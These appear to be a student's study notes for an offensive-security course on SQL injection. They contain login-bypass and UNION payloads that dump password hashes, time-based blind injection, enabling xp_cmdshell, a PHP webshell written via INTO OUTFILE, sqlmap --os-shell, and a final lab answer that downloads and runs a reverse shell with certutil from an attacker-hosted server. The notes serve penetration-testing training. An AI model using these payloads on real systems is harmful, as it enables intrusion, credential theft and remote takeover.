# Sql theory
SQL syntax, commands and functions vary  based in which database is being used. Popular ones include
- MySQL
- Microsoft SQL Server
- PostgresSQL
- Oracle
Example MySQL query
`SELECT * FROM users WHERE user_name="leon"`
Select statement instructs the database we want to retreive all records from the keyword users
To automate functionality web apps often embed sql queries into the source code

# DB Types and Characteristics
## MySql
First let's explore MySQL
we can connect to remote mysql servers with the following command:
`mysql -u root -p'root' -h 192.168.50.16 -P 3306`
we can run `version()` to get the version of the db
verify the user `select system_user()`
We can collect a list of all databases running by using `show databases`
From here we can see tables in a db by running `SHOW TABELS From <database>`
Here is an example command to select the password for the user 'offsec'
`SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
## MSSQL
Built in cmd line tool SQLCMD allows SQL queries to be run through command prompt or remotely
kali includes impacket; a python framework that enables network protocol interactions. --> we can use the *impacket-mssqlclient* tool
exmaple
`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
In this example -windows-auth forces NTLM
to see the version we run `SELECT @@version;`
To list all the available databseas, we can select all names from the system catalog
`SELECT name FROM sys.database`
When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.
Default Databases
- master
- tempdb
- model
- msdb
We want to explore the custom ones
we can query the offsec table by selecting tables in the coresponding information schema
`SELECT * FROM offsec.information_schema.tables;`
we see the follwoing output:
```mssql
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA                                                                                                                       TABLE_NAME                                                                                                                         TABLE_TYPE

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------

offsec                                                                                                                             dbo                                                                                                                                users                                                                                                                              b'BASE TABLE'
```
the only table available is users --> dbo is the schema
to access users we run
`select * from offsec.dbo.users;`
# Identifying SQLi payloads
We can start by inspecting the code for logins --> we may be able to see if the application is sanitizing the input or not
we can try to login using using SQLi via the following code:
`offec' OR 1=1 --//`
the single quote will close off the username field and inject the statement OR 1=1 which will always be true
the '--' ends the sql statement so there is no password comparison and the  // makes sure nothing is truncated
If this vulnerability is present we may also be able to query the database directly with the command:
```sql
' OR 1=1 in (SELECT * FROM users) -- //
```
# UNION-based Payloads
If we are dealing with SQLI and the result of the query is dispayed along with the application returned value, we should also check for UNION-based SQL injections
the UNION keyword aids exploitation because because it enables the execution of an extra SELECT statement and provides results in the same query
For these attacks to work there are two conditions we need to satisfy
- the injected UNION query has to include the same number of columns as the original query
- The data types need to be compatible between each column
Example
	To demonstrate this concept, let's test a web application with the following preconfigured SQL query:
	```
	$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
	```
	The query fetches all the records from the _customers_ table. It also includes the **LIKE**[2](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/sql-injection-attacks/manual-sql-exploitation/union-based-payloads#fn2) keyword to search any _name_ values containing our input that are followed by zero or any number of characters, as specified by the percentage (_%_) operator.
	Before crafting any attack we need to know the number of columns --> ==we can find this out by submitting injecting the query== `'ORDER BY 1 -- //`
	the above statement will fail whenever the selected column doesn't exist --> increase value until an error is returned
	in our example we get an error when the value is 6, so we know there are 5 columns
	with this in mind we can attempt our first attack by enumerating the current database for name, user, and version
	```
	%' UNION SELECT database(), user(), @@version, null, null -- //
	```
	The last two columns are left null to make sure we match the original table
	We will see the return value of the injected code at the bottom of the table except we are missing the first column we requested.
	Most web apps have an "id" value in the first column that isn't displayed. --> we should lead with the "nulls"
	Additioanlly, some web apps might only be configured to display a certain data type. Try to match integers with integers, strings with strings if possible
	```
	' UNION SELECT null, null, database(), user(), @@version  -- //
	```
	Now let's try to enumerate the information schema to get more info on the table
	```
	' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
	```
	from the output we get two tables, customers and users, and we see that the user table has a column called passwords
	Let's dump the users table
	```
	' UNION SELECT null, username, password, description, null FROM users -- //
	```
	We get the hashes
# Blind Sql injection
Previously sql queires we saw were in-band, because we were able to see the output
Blind sql injections describe scenarios where responses are never returned
time based blind SQLi infer query results by instructing the database to wait a specific amount of time. Based on response time we can determine if something is TRUE or FALSE
For Example if we see the url of a website includes a value from a table like username we can add logic to query the table and see if other names are valid
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since 1=1 will always be true the app will return values only if the user name is present
We an also put in a sleep statement to execute if the AND evaluates to false
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
# Manual Code Execution
Depending on the underlying system we need to adapt our strategy to get code execution
In MS SQL the **xp_cmdshell** function takes a string and passes it to  command shell. The function returns any output as rows of text. This function is disabled by default and if enabled it must be called with the EXECUTE Keyword --> ==We can check user permission to see if we can reconfigure the server to enable this option==
To check permissions on MS SQL run `fn_my_permissions ( securable , 'securable_class' )` where securable can be a server or database name
Example of enabling xp_cmdshell:
```sql
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```
Once xp_cmdshell is enabled we can execute commands on the system:
```sql
EXECUTE xp_cmdshell 'whoami'
```
To gain a reverse shell we can write a simple php webshell to a file and then navigate to it via browser
- For this attack to work the file location must be writable to the OS user running the database software
- Not explicitly said, but I would think the file has to be reachable by the browser. The following example uses /tmp, but consider writing it under the web root somewhere so we know we have access
In this example we assume the vulnerability is a UNION-based attack:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
The php system function will parse any statement included in the cmd parameter coming form the client
Note: we may receive an error about return types being incompatible. This does not impact writing the webshell to a file.
We can now navigate to the webshell and execute commands via the cmd parameter
# Automating the Attack
The SQLi process can be automated using several pre installed tools on Kali
==**NOTE AUTOMATED SQL INJECTION TOOLS ARE PROHIBITED ON THE OSCP EXAM**==
Let's run sqlmap on the vulnerable web app
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```
-u specifies the url
-p specifies the parameter to test
SQL map will return information about attacks. In this case it shows we are dealing with a time based blind SQLi
We can use SQLmap to dump the database:
```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```
sqlmap outputs info as it goes and we can see we are getting data from the tables
Since this is a time based sqli it is a little slow but eventually we dump the tables
sqlmap also has a core feature to provide a full interactive shell --os-shell
Note since time based attacks involve a lot of latency a shell is not good for those. In this example we switch to a union based attack
- First we need to intercept a post request going to the web app with burpsuite
- Save the POST request as a text file in Kali
- Invoke sqlmap witht the -r parameter using the post file as an arguement. We also need to indicate item is the vulnerable field
- include --os-shell paramter
- include web root we found earlier
- `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`
# Capstone Notes
Make sure we are adding host names into /etc/hosts if the site has a redirect. **This includes links from the intial site**. If we end up at a weird website try adding address to etc hosts and see if site changes
==You may not need to manually interact with a SQLi vulneraility. It may not be present on a page reachable by the user== --> if no SQLi vulns are found we can use tools like wpscan to further enumerate the website --> ==**LOOK at PoC for any vulnerabilties found by scanner**==
Don't Forget about blind SQLi. Things like subscribing to a newsletter where a POST command is used may be sending to a sql database
==we can use repeater against any potential fields to try multiple sql injection attacks==
Don't forget to try union attacks
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection --> Good resource for syntax
Question 10.3.2.7 I identified the vulnerable field ||username via time based SQLi and injected commands to enable xp_cmdshell:
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure 'xp_cmdshell', 1;--
';RECONFIGURE;--
and then I host my reverse shell script on an http server, port 8000, via python -m http.server
Finally, I run ';EXEC xp_cmdshell 'certutil.exe -f -URLcache http://192.168.45.183:8000/ps_rev.ps1 C:\Users\Public\ps_rev.ps1';--
';EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';--